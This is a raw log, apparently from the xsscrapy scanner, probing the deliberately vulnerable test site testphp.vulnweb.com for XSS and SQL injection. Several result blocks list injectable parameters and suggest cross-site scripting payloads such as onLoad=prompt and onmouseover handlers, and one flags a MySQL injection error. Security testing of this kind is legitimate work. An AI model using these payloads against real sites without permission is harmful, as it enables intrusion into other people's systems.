+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded form param uaddress to: http://testphp.vulnweb.com/secured/newuser.php
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/index.php> (referer: http://testphp.vulnweb.com/index.php)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded form param uphone to: http://testphp.vulnweb.com/secured/newuser.php
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/index.php> (referer: 1zqjck'"(){}<x>:/1zqjck;9)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded form param uemail to: http://testphp.vulnweb.com/secured/newuser.php
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?cat=4> (referer: http://testphp.vulnweb.com/categories.php)
+2022-06-21 14:33:12 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/requestXaX404>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded form param ucc to: http://testphp.vulnweb.com/secured/newuser.php
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?cat=3> (referer: http://testphp.vulnweb.com/categories.php)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded form param urname to: http://testphp.vulnweb.com/secured/newuser.php
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12> (referer: http://testphp.vulnweb.com/hpp/?pp=12)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded form param upass2 to: http://testphp.vulnweb.com/secured/newuser.php
+2022-06-21 14:33:12 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/requestXaX404>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:12 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/index.php/1zqjel'%22()%7B%7D%3Cx%3E:1zqjel;9>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:12 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/index.php. type = header, cookie
+
+
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/hpp/1zqjai'%22()%7B%7D%3Cx%3E:1zqjai;9/?pp=12> (referer: http://testphp.vulnweb.com/hpp/?pp=12)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded form param upass to: http://testphp.vulnweb.com/secured/newuser.php
+2022-06-21 14:33:12 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/index.php. type = header, Referer
+
+
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/hpp/?pp=1zqjbn'%22()%7B%7D%3Cx%3E:/1zqjbn;9> (referer: http://testphp.vulnweb.com/hpp/?pp=12)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/listproducts.php/1zqjtz'%22()%7B%7D%3Cx%3E:1zqjtz;9/?cat=4
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/hpp/?pp=12> (referer: http://testphp.vulnweb.com/hpp/?pp=12)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/hpp/params.php/1zqjlm'%22()%7B%7D%3Cx%3E:1zqjlm;9/?p=valid&pp=12
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/hpp/?pp=12> (referer: 1zqjxm'"(){}<x>:/1zqjxm;9)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=1zqjbo'%22()%7B%7D%3Cx%3E:/1zqjbo;9
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?cat=2> (referer: http://testphp.vulnweb.com/categories.php)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/hpp/params.php?p=1zqjyc'%22()%7B%7D%3Cx%3E:/1zqjyc;9&pp=12
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?cat=1> (referer: http://testphp.vulnweb.com/categories.php)
+2022-06-21 14:33:12 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/hpp/1zqjai'%22()%7B%7D%3Cx%3E:1zqjai;9/?pp=12>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/categories.php/1zqjxy'%22()%7B%7D%3Cx%3E:1zqjxy;9> (referer: http://testphp.vulnweb.com/categories.php)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/listproducts.php/1zqjax'%22()%7B%7D%3Cx%3E:1zqjax;9/?cat=3
+2022-06-21 14:33:12 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/hpp/?pp=12
+2022-06-21 14:33:12 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/hpp/?pp=1zqjbn'%22()%7B%7D%3Cx%3E:/1zqjbn;9
+2022-06-21 14:33:12 [xsscrapy] INFO:     Ongefilterde tekens: '"(){}<x>:/;
+2022-06-21 14:33:12 [xsscrapy] INFO:     Payload: 1zqjbn'"(){}<x>:/1zqjbn;9
+2022-06-21 14:33:12 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:12 [xsscrapy] INFO:     Injectiepunten: pp
+2022-06-21 14:33:12 [xsscrapy] INFO:     Mogelijke payloads: x"><svG onLoad=prompt(9)>, x"/onmouseover=prompt(9)/", x" onmouseover=prompt(9) "
+2022-06-21 14:33:12 [xsscrapy] INFO:     Line: <a href="params.php?p=valid&pp=1zqjbn'"(){}<x>:/1zqjbn;9
+2022-06-21 14:33:12 [scrapy.core.scraper] DEBUG: Scraped from <200 http://testphp.vulnweb.com/hpp/?pp=1zqjbn'%22()%7B%7D%3Cx%3E:/1zqjbn;9>
+
+
+2022-06-21 14:33:12 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/hpp/?pp=12. type = header, cookie
+
+
+2022-06-21 14:33:12 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/hpp/?pp=12. type = header, Referer
+
+
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/listproducts.php?cat=1zqjvx'%22()%7B%7D%3Cx%3E:/1zqjvx;9
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/1zqjoo'%22()%7B%7D%3Cx%3E:1zqjoo;9> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/)
+2022-06-21 14:33:13 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/categories.php/1zqjxy'%22()%7B%7D%3Cx%3E:1zqjxy;9>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/)
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/> (referer: 1zqjzq'"(){}<x>:/1zqjzq;9)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html/1zqjat'%22()%7B%7D%3Cx%3E:1zqjat;9
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/1zqjki'%22()%7B%7D%3Cx%3E:1zqjki;9> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/)
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/1zqjec'%22()%7B%7D%3Cx%3E:1zqjec;9
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/1zqjoo'%22()%7B%7D%3Cx%3E:1zqjoo;9. type = url, end of url
+
+
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/. type = header, cookie
+
+
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/. type = header, Referer
+
+
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/)
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/> (referer: 1zqjtq'"(){}<x>:/1zqjtq;9)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html/1zqjaw'%22()%7B%7D%3Cx%3E:1zqjaw;9
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/1zqjki'%22()%7B%7D%3Cx%3E:1zqjki;9. type = url, end of url
+
+
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/1zqjit'%22()%7B%7D%3Cx%3E:1zqjit;9
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/1zqjwq'%22()%7B%7D%3Cx%3E:1zqjwq;9> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/. type = header, cookie
+
+
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/> (referer: 1zqjmg'"(){}<x>:/1zqjmg;9)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/categories.php> (referer: http://testphp.vulnweb.com/categories.php)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/. type = header, Referer
+
+
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/signup.php/1zqjys'%22()%7B%7D%3Cx%3E:1zqjys;9> (referer: http://testphp.vulnweb.com/signup.php)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html/1zqjwb'%22()%7B%7D%3Cx%3E:1zqjwb;9
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/1zqjwq'%22()%7B%7D%3Cx%3E:1zqjwq;9. type = url, end of url
+
+
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/. type = header, cookie
+
+
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <POST http://testphp.vulnweb.com/secured/newuser.php> (referer: http://testphp.vulnweb.com/signup.php)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/1zqjkg'%22()%7B%7D%3Cx%3E:1zqjkg;9
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <POST http://testphp.vulnweb.com/secured/newuser.php> (referer: http://testphp.vulnweb.com/signup.php)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/. type = header, Referer
+
+
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <POST http://testphp.vulnweb.com/secured/newuser.php> (referer: http://testphp.vulnweb.com/signup.php)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/categories.php. type = header, cookie
+
+
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <POST http://testphp.vulnweb.com/secured/newuser.php> (referer: http://testphp.vulnweb.com/signup.php)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:13 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/signup.php/1zqjys'%22()%7B%7D%3Cx%3E:1zqjys;9>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <POST http://testphp.vulnweb.com/secured/newuser.php> (referer: http://testphp.vulnweb.com/signup.php)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <POST http://testphp.vulnweb.com/secured/newuser.php> (referer: http://testphp.vulnweb.com/signup.php)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <POST http://testphp.vulnweb.com/secured/newuser.php> (referer: http://testphp.vulnweb.com/signup.php)
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/secured/newuser.php. type = form, uaddress
+
+
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/secured/newuser.php. type = form, uphone
+
+
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/listproducts.php/1zqjtz'%22()%7B%7D%3Cx%3E:1zqjtz;9/?cat=4> (referer: http://testphp.vulnweb.com/listproducts.php?cat=4)
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/secured/newuser.php. type = form, uemail
+
+
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/secured/newuser.php. type = form, ucc
+
+
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/hpp/params.php/1zqjlm'%22()%7B%7D%3Cx%3E:1zqjlm;9/?p=valid&pp=12> (referer: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12)
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/secured/newuser.php. type = form, urname
+
+
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=1zqjbo'%22()%7B%7D%3Cx%3E:/1zqjbo;9> (referer: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12)
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/secured/newuser.php. type = form, upass2
+
+
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/hpp/params.php?p=1zqjyc'%22()%7B%7D%3Cx%3E:/1zqjyc;9&pp=12> (referer: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12)
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12> (referer: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12)
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/secured/newuser.php. type = form, upass
+
+
+2022-06-21 14:33:13 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/listproducts.php/1zqjtz'%22()%7B%7D%3Cx%3E:1zqjtz;9/?cat=4>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12> (referer: 1zqjbh'"(){}<x>:/1zqjbh;9)
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/listproducts.php/1zqjax'%22()%7B%7D%3Cx%3E:1zqjax;9/?cat=3> (referer: http://testphp.vulnweb.com/listproducts.php?cat=3)
+2022-06-21 14:33:13 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/hpp/params.php/1zqjlm'%22()%7B%7D%3Cx%3E:1zqjlm;9/?p=valid&pp=12>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?cat=1zqjvx'%22()%7B%7D%3Cx%3E:/1zqjvx;9> (referer: http://testphp.vulnweb.com/listproducts.php?cat=3)
+2022-06-21 14:33:13 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12
+2022-06-21 14:33:13 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=1zqjbo'%22()%7B%7D%3Cx%3E:/1zqjbo;9
+2022-06-21 14:33:13 [xsscrapy] INFO:     Ongefilterde tekens: '"(){}<x>:/;
+2022-06-21 14:33:13 [xsscrapy] INFO:     Payload: 1zqjbo'"(){}<x>:/1zqjbo;9
+2022-06-21 14:33:13 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:13 [xsscrapy] INFO:     Injectiepunten: pp
+2022-06-21 14:33:13 [xsscrapy] INFO:     Mogelijke payloads: <svG onLoad=prompt(9)>
+2022-06-21 14:33:13 [xsscrapy] INFO:     Line: <pvalid1zqjbo'"(){}<x>:/1zqjbo;9
+2022-06-21 14:33:13 [scrapy.core.scraper] DEBUG: Scraped from <200 http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=1zqjbo'%22()%7B%7D%3Cx%3E:/1zqjbo;9>
+
+
+2022-06-21 14:33:13 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12
+2022-06-21 14:33:13 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/hpp/params.php?p=1zqjyc'%22()%7B%7D%3Cx%3E:/1zqjyc;9&pp=12
+2022-06-21 14:33:13 [xsscrapy] INFO:     Ongefilterde tekens: '"(){}<x>:/;
+2022-06-21 14:33:13 [xsscrapy] INFO:     Payload: 1zqjyc'"(){}<x>:/1zqjyc;9
+2022-06-21 14:33:13 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:13 [xsscrapy] INFO:     Injectiepunten: p
+2022-06-21 14:33:13 [xsscrapy] INFO:     Mogelijke payloads: <svG onLoad=prompt(9)>
+2022-06-21 14:33:13 [xsscrapy] INFO:     Line: <p1zqjyc'"(){}<x>:/1zqjyc;9
+2022-06-21 14:33:13 [scrapy.core.scraper] DEBUG: Scraped from <200 http://testphp.vulnweb.com/hpp/params.php?p=1zqjyc'%22()%7B%7D%3Cx%3E:/1zqjyc;9&pp=12>
+
+
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg> (referer: http://testphp.vulnweb.com/listproducts.php?cat=2)
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12. type = header, cookie
+
+
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12. type = header, Referer
+
+
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html)
+2022-06-21 14:33:13 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/listproducts.php/1zqjax'%22()%7B%7D%3Cx%3E:1zqjax;9/?cat=3>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/listproducts.php/1zqjld'%22()%7B%7D%3Cx%3E:1zqjld;9/?cat=1
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html/1zqjat'%22()%7B%7D%3Cx%3E:1zqjat;9> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/listproducts.php?cat=1zqjgr'%22()%7B%7D%3Cx%3E:/1zqjgr;9
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html> (referer: 1zqjfn'"(){}<x>:/1zqjfn;9)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:13 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/listproducts.php?cat=3
+2022-06-21 14:33:13 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/listproducts.php?cat=1zqjvx'%22()%7B%7D%3Cx%3E:/1zqjvx;9
+2022-06-21 14:33:13 [xsscrapy] INFO:     Ongefilterde tekens: N/A
+2022-06-21 14:33:13 [xsscrapy] INFO:     Payload: 1zqjvx'"(){}<x>:/1zqjvx;9
+2022-06-21 14:33:13 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:13 [xsscrapy] INFO:     Injectiepunten: cat
+2022-06-21 14:33:13 [xsscrapy] INFO:     Line: Possible SQL injection error! Suspected DBMS: MySQL, regex used: SQL syntax.*MySQL
+2022-06-21 14:33:13 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/listproducts.php?cat=3
+2022-06-21 14:33:13 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/listproducts.php?cat=1zqjvx'%22()%7B%7D%3Cx%3E:/1zqjvx;9
+2022-06-21 14:33:13 [xsscrapy] INFO:     Ongefilterde tekens: '"(){}<x>:/
+2022-06-21 14:33:13 [xsscrapy] INFO:     Payload: 1zqjvx'"(){}<x>:/1zqjvx;9
+2022-06-21 14:33:13 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:13 [xsscrapy] INFO:     Injectiepunten: cat
+2022-06-21 14:33:13 [xsscrapy] INFO:     Line: 	error: you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near ''"(){}<x>:/1zqjvx;9' at line 1
+2022-06-21 14:33:13 [xsscrapy] INFO:     Fout: Payload delims do not surround this injection point. Found via search for entire payload.
+2022-06-21 14:33:13 [scrapy.core.scraper] DEBUG: Scraped from <200 http://testphp.vulnweb.com/listproducts.php?cat=1zqjvx'%22()%7B%7D%3Cx%3E:/1zqjvx;9>
+
+
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=7> (referer: http://testphp.vulnweb.com/listproducts.php?cat=1)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/showimage.php/1zqjbn'%22()%7B%7D%3Cx%3E:1zqjbn;9/?file=./pictures/6.jpg
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/1zqjec'%22()%7B%7D%3Cx%3E:1zqjec;9> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/showimage.php?file=1zqjge'%22()%7B%7D%3Cx%3E:/1zqjge;9
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html/1zqjaw'%22()%7B%7D%3Cx%3E:1zqjaw;9> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html. type = header, cookie
+
+
+2022-06-21 14:33:13 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html/1zqjat'%22()%7B%7D%3Cx%3E:1zqjat;9>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:13 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html. type = header, Referer
+
+
+2022-06-21 14:33:13 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html)
+2022-06-21 14:33:13 [xsscrapy] DEBUG: Sending payloaded Referer header
